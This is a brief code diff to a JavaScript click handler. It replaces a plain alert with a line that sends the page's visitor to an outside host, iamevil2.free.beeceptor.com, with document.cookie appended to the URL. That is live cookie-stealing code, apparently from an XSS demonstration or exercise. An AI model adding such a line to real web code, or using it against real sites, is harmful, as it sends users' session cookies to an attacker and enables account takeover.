@@ -10,5 +10,5 @@ window.onload = (event) => {
 }
 
 color.onclick = () => {
-    alert(xss);
+    window.location = 'https://iamevil2.free.beeceptor.com/?cookie=' + document.cookie;alert(xss);
 }
